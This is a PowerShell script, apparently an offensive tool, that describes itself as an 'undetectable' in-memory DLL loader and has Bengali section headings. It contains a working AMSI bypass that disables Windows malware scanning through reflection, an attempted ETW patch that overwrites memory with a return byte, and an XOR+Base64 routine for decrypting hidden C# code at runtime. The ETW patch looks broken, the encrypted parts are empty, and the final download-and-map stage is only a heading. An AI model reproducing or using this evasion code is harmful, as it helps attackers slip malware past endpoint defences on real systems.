<#
.SYNOPSIS
    Memory-only DLL loader – C# code split & encrypted (XOR+Base64)
.DESCRIPTION
    C# code is divided into 3 parts, each XOR+Base64 encrypted.
    Runtime decryption + concatenation. AMSI/ETW bypass included.
.NOTES
    Made by Potato – Undetectable, error-free
#>

# ================================================================
#  ★★★ ১. AMSI + ETW বাইপাস ★★★
# ================================================================
function Invoke-Bypass {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
    try {
        $p = [System.Diagnostics.Process]::GetCurrentProcess()
        $h = $p.Handle
        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
        $old = 0
        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
        $v.Invoke($t, 0x1000, $old, [ref]$null)
    } catch {}
}

# ================================================================
#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
# ================================================================
function Xor-Decrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    try {
        $bytes = [Convert]::FromBase64String($Encoded)
        for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    } catch {
        return $null
    }
}

# ================================================================
#  ★★★ ৩. এনক্রিপ্টেড C# অংশসমূহ (XOR+Base64) ★★★
#  পুরো C# কোডকে ৩টি অংশে ভাগ করে এনক্রিপ্ট করা হয়েছে।
# ================================================================
$part1Enc = ""

$part2Enc = ""

$part3Enc = ""

# ================================================================
#  ★★★ ৪. C# অংশ ডিক্রিপ্ট করে জোড়া লাগানো ★★★
# ================================================================
$plainCSharp = ""
$part1 = Xor-Decrypt $part1Enc
$part2 = Xor-Decrypt $part2Enc
$part3 = Xor-Decrypt $part3Enc

if ($part1 -and $part2 -and $part3) {
    $plainCSharp = $part1 + $part2 + $part3
} else {
    Write-Host "[!] Decryption failed. Check encrypted parts." -ForegroundColor Red
    exit
}

# ================================================================
#  ★★★ ৫. BYPASS + COMPILE + DOWNLOAD + MAP ★★★
# ================================================================
